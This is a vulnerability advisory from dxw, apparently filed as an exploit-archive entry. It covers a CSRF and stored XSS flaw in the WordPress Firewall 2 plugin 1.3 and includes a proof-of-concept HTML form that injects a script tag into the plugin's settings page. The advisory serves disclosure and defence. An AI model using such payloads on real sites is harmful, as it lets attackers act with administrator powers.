@@ -1,0 +1,58 @@
+<!--
+Details
+================
+Software: WordPress Firewall 2
+Version: 1.3
+Homepage: https://wordpress.org/plugins/wordpress-firewall-2/
+Advisory report: https://security.dxw.com/advisories/csrfstored-xss-in-wordpress-firewall-2-allows-unauthenticated-attackers-to-do-almost-anything-an-admin-can/
+CVE: Awaiting assignment
+CVSS: 5.8 (Medium; AV:N/AC:M/Au:N/C:P/I:P/A:N)
+
+Description
+================
+CSRF/stored XSS in WordPress Firewall 2 allows unauthenticated attackers to do almost anything an admin can
+
+Vulnerability
+================
+HTML is not escaped and there is no CSRF prevention, meaning attackers can put arbitrary HTML content onto the settings page.
+
+Proof of concept
+================
+Visit the following page, click on the submit button, then visit the plugin’s options page:
+-->
+
+<form method=\"POST\" action=\"http://localhost/wp-admin/options-general.php?page=wordpress-firewall-2%2Fwordpress-firewall-2.php\">
+  <input type=\"text\" name=\"email_address\" value=\""><script>alert(1)</script>\">
+  <input type=\"text\" name=\"set_email\" value=\"Set Email\">
+  <input type=\"submit\">
+</form>
+
+<!--
+In a real attack, forms can be submitted automatically and spear-phishing attacks can be convincing.
+
+Mitigations
+================
+Disable the plugin until a new version is released that fixes this bug.
+
+Disclosure policy
+================
+dxw believes in responsible disclosure. Your attention is drawn to our disclosure policy: https://security.dxw.com/disclosure/
+
+Please contact us on security@dxw.com to acknowledge this report if you received it via a third party (for example, plugins@wordpress.org) as they generally cannot communicate with us on your behalf.
+
+This vulnerability will be published if we do not receive a response to this report with 14 days.
+
+Timeline
+================
+
+2016-12-23: Discovered
+2017-03-16: Reported to vendor by email
+2017-04-04: Vendor could not be contacted
+
+
+
+Discovered by dxw:
+================
+Tom Adams
+Please visit security.dxw.com for more information.
+-->
